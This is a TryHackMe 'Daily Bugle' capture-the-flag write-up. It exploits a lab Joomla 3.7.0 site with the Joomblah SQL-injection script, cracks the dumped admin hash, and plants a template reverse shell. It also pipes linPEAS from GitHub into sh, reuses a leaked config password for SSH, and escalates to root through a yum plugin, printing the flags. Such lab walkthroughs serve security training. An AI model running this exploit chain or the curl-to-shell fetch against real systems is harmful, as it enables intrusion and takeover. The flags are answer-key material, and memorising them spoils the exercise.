# Daily Bugle Writeup
#pentest/tryhackme


We have a web page, by the source code we see mentions of **Joomla**, a PHP framework.
How do we find out the framework’s version?

I always like to start with something like **dirsearch** to find out interesting endpoints we haven’t explored.

```shell
$ python3 dirsearch.py -u http://10.10.173.12 -e php
...
[23:36:38] 301 -  242B  - /administrator  ->  http://10.10.173.12/administrator/                            
[23:36:39] 403 -  225B  - /administrator/.htaccess
[23:36:39] 301 -  247B  - /administrator/logs  ->  http://10.10.173.12/administrator/logs/
[23:36:39] 200 -    5KB - /administrator/           
[23:36:39] 200 -    5KB - /administrator/index.php
[23:36:51] 301 -  232B  - /bin  ->  http://10.10.173.12/bin/                                                      
[23:36:51] 200 -   31B  - /bin/        
[23:36:53] 301 -  234B  - /cache  ->  http://10.10.173.12/cache/      
[23:36:53] 200 -   31B  - /cache/      
[23:36:55] 403 -  210B  - /cgi-bin/                                     
[23:36:59] 301 -  239B  - /components  ->  http://10.10.173.12/components/     
[23:37:01] 200 -    0B  - /configuration.php               
[23:37:20] 200 -    3KB - /htaccess.txt                                                               
[23:37:22] 301 -  235B  - /images  ->  http://10.10.173.12/images/ 
[23:37:23] 301 -  237B  - /includes  ->  http://10.10.173.12/includes/
[23:37:23] 200 -   31B  - /includes/
[23:37:23] 200 -    9KB - /index.php                                                                           
[23:37:28] 301 -  237B  - /language  ->  http://10.10.173.12/language/                                  
[23:37:29] 301 -  238B  - /libraries  ->  http://10.10.173.12/libraries/  
[23:37:30] 200 -   18KB - /LICENSE.txt           
[23:37:36] 301 -  234B  - /media  ->  http://10.10.173.12/media/
[23:37:38] 301 -  236B  - /modules  ->  http://10.10.173.12/modules/
[23:37:52] 301 -  236B  - /plugins  ->  http://10.10.173.12/plugins/                    
[23:37:56] 200 -    4KB - /README.txt                                                          
[23:37:58] 200 -  836B  - /robots.txt           
[23:38:13] 301 -  238B  - /templates  ->  http://10.10.173.12/templates/                                          
[23:38:13] 200 -   31B  - /templates/
[23:38:15] 301 -  232B  - /tmp  ->  http://10.10.173.12/tmp/                
[23:38:15] 200 -   31B  - /tmp/     
[23:38:21] 200 -    2KB - /web.config.txt
```

Tons of interesting leads.

README.txt has mentions to version 3.7.

```
1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/master

```

So 3.7.0 it is, thank you readme! 

We can also find out a bit more about the version and potential vulnerabilities using the handy [GitHub - rezasp/joomscan: OWASP Joomla Vulnerability Scanner Project](https://github.com/rezasp/joomscan) tool.

```shell
$ perl joomscan.pl -u 10.10.249.35
...
[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
...
                                                                                                              
```

The report also lists tons of interesting directories to be explored. Let’s see if we can find a Joomla vulnerability first though.

```shell
$ searchsploit joomla -w -s 3.7
------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                    |  URL
------------------------------------------------------------------------------------------------------------------------------------
Joomla! 3.7 - SQL Injection                                                       | https://www.exploit-db.com/exploits/44227
Joomla! 3.7.0 - 'com_fields' SQL Injection                                        | https://www.exploit-db.com/exploits/42033
Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                  | https://www.exploit-db.com/exploits/46769
Joomla! Component com_realestatemanager 3.7 - SQL Injection                       | https://www.exploit-db.com/exploits/38445
Joomla! Component J2Store < 3.3.7 - SQL Injection                                 | https://www.exploit-db.com/exploits/46467
Joomla! Component JomEstate PRO 3.7 - 'id' SQL Injection                          | https://www.exploit-db.com/exploits/44117
Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                               | https://www.exploit-db.com/exploits/42589
------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

We seem to have a few options here.  Let’s give the `com_fields` one a shot: https://www.exploit-db.com/exploits/42033

According to the exploitdb page we can use `SqlMap` , but let’s use another script in our case. [exploits/Joomblah at master · XiphosResearch/exploits · GitHub](https://github.com/XiphosResearch/exploits/tree/master/Joomblah)

```shell
$ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
...
$ python joomblah.py http://<machine-ip>:<machine-port>
...
[-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Seems like we have a super user called `jonah` with password `'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'`
The three `.` makes me suspicious of JWT. Let’s do a base64 decode.

```shell
irb(main):002:0> Base64.decode64('$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm')
=> "\xDB-t\xD2\xF7\x8E\xFC\x94\x85\x87\x8D\xFC\xF4\xB9ns\x85\xF2i\xD7\xF2\xD8\xC1[f\x1C\xF4\x8DS0U\xDD\xE9\xD7i\x01\xB5\x9B\xAD"
```

Doesn’t seem like it… well.. what now? John the ripper it! 

```shell
$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:07:40 DONE (2020-06-28 19:32) 0.002170g/s 101.6p/s 101.6c/s 101.6C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

`jonah/spiderman123` let’s go!

After logging in, like any CMS, if we can manipulate the PHP code we have a way in. Let’s go to:

1. Extensions -> Templates -> Select the Template we want -> Change index.php to have the reverse shell code.
2. Now we can set a netcat listener and refresh the main page, our template code will be executed.


```shell
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.13.100] from (UNKNOWN) [10.10.249.35] 45320
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:42:44 up 54 min,  0 users,  load average: 0.09, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
ls /home
jjameson
```

So we have a `jjameson` user but we don’t have their password. One idea is to try and escalate privileges using linPEAS: [privilege-escalation-awesome-scripts-suite/linPEAS at master · carlospolop/privilege-escalation-awesome-scripts-suite · GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```shell
$ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

Of the many things linPEAS flags us one of them is a password in `/var/www/html/configuration.php` -> `nv5uz9r3ZEDzVjNu`
Can we use it to ssh into the machine?

```shell
ssh jjameson@10.10.68.45
...
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

Sweet! Privilege escalation time!

As always we first check which commands our user can run as sudo:

```shel
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE
    KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Can we find an exploit for `/usr/bin/yum`?  Sure we can!  [yum  |  GTFOBins](https://gtfobins.github.io/gtfobins/yum/)

```shell
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# ls /root/
anaconda-ks.cfg  root.txt
sh-4.2# cat /root/root.txt 
eec3d53292b1821868266858d7fa6f79
```

